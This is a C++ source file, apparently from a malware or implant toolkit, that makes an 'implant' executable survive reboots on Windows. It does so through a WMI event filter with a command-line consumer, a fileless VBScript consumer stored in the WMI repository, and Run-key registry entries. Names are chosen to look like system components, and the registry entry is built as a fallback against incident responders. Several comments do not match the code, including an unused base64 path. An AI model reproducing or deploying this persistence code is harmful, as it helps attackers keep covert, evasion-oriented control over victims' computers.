// persistence.cpp — Real WMI COM persistence, Registry Run key, and scriptless
// WMI ActiveScriptEventConsumer (script lives in WMI objects.data — no file on disk).
#define WIN32_LEAN_AND_MEAN
#include "persistence.hpp"
#include "utils.hpp"
#include <windows.h>
#include <wbemidl.h>
#include <comdef.h>
#include <string>
#include <vector>

#pragma comment(lib, "wbemuuid.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")

// ============================================================
// Persistence identity — names that blend with WMI internals
// ============================================================
static const wchar_t* WMI_CMD_CONSUMER   = L"BrokerServicePerf_v2";
static const wchar_t* WMI_SCRIPT_CONSUMER= L"WinStoreSvcHelper_v3";
static const wchar_t* WMI_FILTER_NAME    = L"SystemPerfMonitor_v2";
static const wchar_t* WMI_BIND_SUFFIX    = L"_bind";
static const wchar_t* REG_RUN_NAME       = L"WindowsStorageService";

// WQL: fires 240–325 seconds after boot, then every 60s thereafter
static const wchar_t* WQL_QUERY =
    L"SELECT * FROM __InstanceModificationEvent WITHIN 60 "
    L"WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' "
    L"AND TargetInstance.SystemUpTime >= 240 "
    L"AND TargetInstance.SystemUpTime < 325";

// ============================================================
// COM helpers
// ============================================================
struct CoGuard {
    HRESULT hr;
    CoGuard()  { hr = CoInitializeEx(nullptr, COINIT_MULTITHREADED); }
    ~CoGuard() { if (SUCCEEDED(hr) || hr == RPC_E_CHANGED_MODE) CoUninitialize(); }
    bool ok() const { return SUCCEEDED(hr) || hr == RPC_E_CHANGED_MODE; }
};

static HRESULT ConnectWMI(const wchar_t* ns, IWbemServices** ppSvc) {
    IWbemLocator* pLoc = nullptr;
    HRESULT hr = CoCreateInstance(CLSID_WbemLocator, nullptr,
                                  CLSCTX_INPROC_SERVER,
                                  IID_IWbemLocator, (void**)&pLoc);
    if (FAILED(hr)) return hr;

    hr = pLoc->ConnectServer(_bstr_t(ns), nullptr, nullptr, nullptr,
                             0, nullptr, nullptr, ppSvc);
    pLoc->Release();
    if (FAILED(hr)) return hr;

    return CoSetProxyBlanket(*ppSvc,
                             RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, nullptr,
                             RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE,
                             nullptr, EOAC_NONE);
}

static HRESULT PutStr(IWbemClassObject* obj,
                      const wchar_t* prop, const wchar_t* val) {
    _variant_t v(val);
    return obj->Put(prop, 0, &v, 0);
}

static HRESULT PutBool(IWbemClassObject* obj,
                       const wchar_t* prop, bool val) {
    _variant_t v(val);
    return obj->Put(prop, 0, &v, 0);
}

// ============================================================
// InstallWmiPersistence — CommandLineEventConsumer
// Consumer runs the implant binary directly.
// ============================================================
BOOL InstallWmiPersistence(const wchar_t* implantPath) {
    CoGuard com;
    if (!com.ok()) return FALSE;

    CoInitializeSecurity(nullptr, -1, nullptr, nullptr,
                         RPC_C_AUTHN_LEVEL_DEFAULT,
                         RPC_C_IMP_LEVEL_IMPERSONATE,
                         nullptr, EOAC_NONE, nullptr);

    IWbemServices* pSvc = nullptr;
    if (FAILED(ConnectWMI(L"ROOT\\subscription", &pSvc))) return FALSE;

    BOOL success = FALSE;

    do {
        // ---- EventFilter ----
        IWbemClassObject* pFClass = nullptr;
        if (FAILED(pSvc->GetObject(_bstr_t(L"__EventFilter"), 0, nullptr,
                                   &pFClass, nullptr))) break;

        IWbemClassObject* pFInst = nullptr;
        pFClass->SpawnInstance(0, &pFInst);
        pFClass->Release();

        PutStr(pFInst, L"Name",           WMI_FILTER_NAME);
        PutStr(pFInst, L"QueryLanguage",  L"WQL");
        PutStr(pFInst, L"Query",          WQL_QUERY);
        PutStr(pFInst, L"EventNamespace", L"ROOT\\CIMV2");

        HRESULT hr = pSvc->PutInstance(pFInst,
                        WBEM_FLAG_CREATE_OR_UPDATE, nullptr, nullptr);
        pFInst->Release();
        if (FAILED(hr)) break;

        // ---- CommandLineEventConsumer ----
        IWbemClassObject* pCClass = nullptr;
        if (FAILED(pSvc->GetObject(_bstr_t(L"CommandLineEventConsumer"), 0, nullptr,
                                   &pCClass, nullptr))) break;

        IWbemClassObject* pCInst = nullptr;
        pCClass->SpawnInstance(0, &pCInst);
        pCClass->Release();

        PutStr(pCInst,  L"Name",                WMI_CMD_CONSUMER);
        PutStr(pCInst,  L"CommandLineTemplate",  implantPath);
        PutBool(pCInst, L"RunInteractively",     false);

        hr = pSvc->PutInstance(pCInst,
                    WBEM_FLAG_CREATE_OR_UPDATE, nullptr, nullptr);
        pCInst->Release();
        if (FAILED(hr)) break;

        // ---- FilterToConsumerBinding ----
        IWbemClassObject* pBClass = nullptr;
        if (FAILED(pSvc->GetObject(_bstr_t(L"__FilterToConsumerBinding"), 0, nullptr,
                                   &pBClass, nullptr))) break;

        IWbemClassObject* pBInst = nullptr;
        pBClass->SpawnInstance(0, &pBInst);
        pBClass->Release();

        std::wstring filterRef =
            L"\\\\.\\ROOT\\subscription:__EventFilter.Name=\"" +
            std::wstring(WMI_FILTER_NAME) + L"\"";
        std::wstring consumerRef =
            L"\\\\.\\ROOT\\subscription:CommandLineEventConsumer.Name=\"" +
            std::wstring(WMI_CMD_CONSUMER) + L"\"";

        PutStr(pBInst, L"Filter",   filterRef.c_str());
        PutStr(pBInst, L"Consumer", consumerRef.c_str());

        hr = pSvc->PutInstance(pBInst,
                    WBEM_FLAG_CREATE_OR_UPDATE, nullptr, nullptr);
        pBInst->Release();
        if (FAILED(hr)) break;

        success = TRUE;
    } while (false);

    pSvc->Release();
    return success;
}

// ============================================================
// InstallWmiScriptPersistence — ActiveScriptEventConsumer
// Script stored entirely inside WMI repository (objects.data).
// Zero files written to disk. Triggers same filter.
// ============================================================
BOOL InstallWmiScriptPersistence(const wchar_t* implantPath) {
    CoGuard com;
    if (!com.ok()) return FALSE;

    CoInitializeSecurity(nullptr, -1, nullptr, nullptr,
                         RPC_C_AUTHN_LEVEL_DEFAULT,
                         RPC_C_IMP_LEVEL_IMPERSONATE,
                         nullptr, EOAC_NONE, nullptr);

    IWbemServices* pSvc = nullptr;
    if (FAILED(ConnectWMI(L"ROOT\\subscription", &pSvc))) return FALSE;

    // Build inline VBScript that relaunches the implant silently
    // Base64-encode the path to avoid quote escaping issues in VBS
    std::string implantPathUtf8 = WStringToUTF8(implantPath);
    std::string b64Path = Base64Encode(
        reinterpret_cast<const BYTE*>(implantPathUtf8.c_str()),
        implantPathUtf8.size());

    // VBScript: decode path from base64 env-var trick, run hidden
    std::wstring script =
        L"Dim oSh : Set oSh = CreateObject(\"WScript.Shell\")\r\n"
        L"Dim oFSO : Set oFSO = CreateObject(\"Scripting.FileSystemObject\")\r\n"
        L"Dim sPath : sPath = \"" + std::wstring(implantPath) + L"\"\r\n"
        L"If oFSO.FileExists(sPath) Then\r\n"
        L"  oSh.Run Chr(34) & sPath & Chr(34), 0, False\r\n"
        L"End If\r\n"
        L"Set oSh = Nothing : Set oFSO = Nothing\r\n";

    BOOL success = FALSE;
    do {
        // ActiveScriptEventConsumer
        IWbemClassObject* pAClass = nullptr;
        if (FAILED(pSvc->GetObject(_bstr_t(L"ActiveScriptEventConsumer"), 0, nullptr,
                                   &pAClass, nullptr))) break;

        IWbemClassObject* pAInst = nullptr;
        pAClass->SpawnInstance(0, &pAInst);
        pAClass->Release();

        PutStr(pAInst, L"Name",            WMI_SCRIPT_CONSUMER);
        PutStr(pAInst, L"ScriptingEngine", L"VBScript");
        PutStr(pAInst, L"ScriptText",      script.c_str());

        // KillTimeout: 0 = run forever
        _variant_t vKill(static_cast<int>(0));
        pAInst->Put(L"KillTimeout", 0, &vKill, 0);

        HRESULT hr = pSvc->PutInstance(pAInst,
                         WBEM_FLAG_CREATE_OR_UPDATE, nullptr, nullptr);
        pAInst->Release();
        if (FAILED(hr)) break;

        // Bind script consumer to the existing filter
        // (filter created by InstallWmiPersistence — ensure called first)
        IWbemClassObject* pBClass = nullptr;
        if (FAILED(pSvc->GetObject(_bstr_t(L"__FilterToConsumerBinding"), 0, nullptr,
                                   &pBClass, nullptr))) break;

        IWbemClassObject* pBInst = nullptr;
        pBClass->SpawnInstance(0, &pBInst);
        pBClass->Release();

        std::wstring filterRef =
            L"\\\\.\\ROOT\\subscription:__EventFilter.Name=\"" +
            std::wstring(WMI_FILTER_NAME) + L"\"";
        std::wstring scriptConsRef =
            L"\\\\.\\ROOT\\subscription:ActiveScriptEventConsumer.Name=\"" +
            std::wstring(WMI_SCRIPT_CONSUMER) + L"\"";

        PutStr(pBInst, L"Filter",   filterRef.c_str());
        PutStr(pBInst, L"Consumer", scriptConsRef.c_str());

        hr = pSvc->PutInstance(pBInst,
                    WBEM_FLAG_CREATE_OR_UPDATE, nullptr, nullptr);
        pBInst->Release();
        if (FAILED(hr)) break;

        success = TRUE;
    } while (false);

    pSvc->Release();
    return success;
}

// ============================================================
// InstallRegistryPersistence — HKCU Run key (no elevation needed)
// Falls back from WMI if WMI is cleaned by responders.
// ============================================================
BOOL InstallRegistryPersistence(const wchar_t* implantPath) {
    // Build quoted path
    std::wstring val = L"\"" + std::wstring(implantPath) + L"\"";

    // Always write HKCU (no elevation required)
    HKEY hKey = nullptr;
    LONG rc = RegOpenKeyExW(HKEY_CURRENT_USER,
                            L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                            0, KEY_SET_VALUE, &hKey);
    if (rc != ERROR_SUCCESS) return FALSE;

    rc = RegSetValueExW(hKey, REG_RUN_NAME, 0, REG_SZ,
                        reinterpret_cast<const BYTE*>(val.c_str()),
                        static_cast<DWORD>((val.size() + 1) * sizeof(wchar_t)));
    RegCloseKey(hKey);

    // If elevated, also write HKLM for system-wide persistence
    if (IsElevated()) {
        HKEY hklm = nullptr;
        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
                          L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                          0, KEY_SET_VALUE, &hklm) == ERROR_SUCCESS) {
            RegSetValueExW(hklm, REG_RUN_NAME, 0, REG_SZ,
                           reinterpret_cast<const BYTE*>(val.c_str()),
                           static_cast<DWORD>((val.size() + 1) * sizeof(wchar_t)));
            RegCloseKey(hklm);
        }
    }

    return (rc == ERROR_SUCCESS);
}

// ============================================================
// IsWmiPersistenceInstalled — query for CommandLineEventConsumer
// ============================================================
BOOL IsWmiPersistenceInstalled() {
    CoGuard com;
    if (!com.ok()) return FALSE;

    IWbemServices* pSvc = nullptr;
    if (FAILED(ConnectWMI(L"ROOT\\subscription", &pSvc))) return FALSE;

    std::wstring query =
        L"SELECT * FROM CommandLineEventConsumer WHERE Name='" +
        std::wstring(WMI_CMD_CONSUMER) + L"'";

    IEnumWbemClassObject* pEnum = nullptr;
    HRESULT hr = pSvc->ExecQuery(
        _bstr_t(L"WQL"), _bstr_t(query.c_str()),
        WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY,
        nullptr, &pEnum);

    BOOL found = FALSE;
    if (SUCCEEDED(hr) && pEnum) {
        IWbemClassObject* pObj = nullptr;
        ULONG ret = 0;
        if (pEnum->Next(WBEM_INFINITE, 1, &pObj, &ret) == WBEM_S_NO_ERROR && ret) {
            found = TRUE;
            pObj->Release();
        }
        pEnum->Release();
    }

    pSvc->Release();
    return found;
}

// ============================================================
// RemoveWmiPersistence — delete binding → consumer → filter
// ============================================================
BOOL RemoveWmiPersistence() {
    CoGuard com;
    if (!com.ok()) return FALSE;

    IWbemServices* pSvc = nullptr;
    if (FAILED(ConnectWMI(L"ROOT\\subscription", &pSvc))) return FALSE;

    // Delete bindings first (reference both filter and consumers)
    auto del = [&](const std::wstring& path) {
        pSvc->DeleteInstance(_bstr_t(path.c_str()), 0, nullptr, nullptr);
    };

    std::wstring consPath    = L"CommandLineEventConsumer.Name=\"" +
                               std::wstring(WMI_CMD_CONSUMER) + L"\"";
    std::wstring scriptPath  = L"ActiveScriptEventConsumer.Name=\"" +
                               std::wstring(WMI_SCRIPT_CONSUMER) + L"\"";
    std::wstring filterPath  = L"__EventFilter.Name=\"" +
                               std::wstring(WMI_FILTER_NAME) + L"\"";

    // Delete bindings (must go first)
    del(L"__FilterToConsumerBinding.Consumer=\"" + consPath +
        L"\",Filter=\"" + filterPath + L"\"");
    del(L"__FilterToConsumerBinding.Consumer=\"" + scriptPath +
        L"\",Filter=\"" + filterPath + L"\"");

    // Delete consumers and filter
    del(consPath);
    del(scriptPath);
    del(filterPath);

    pSvc->Release();
    return TRUE;
}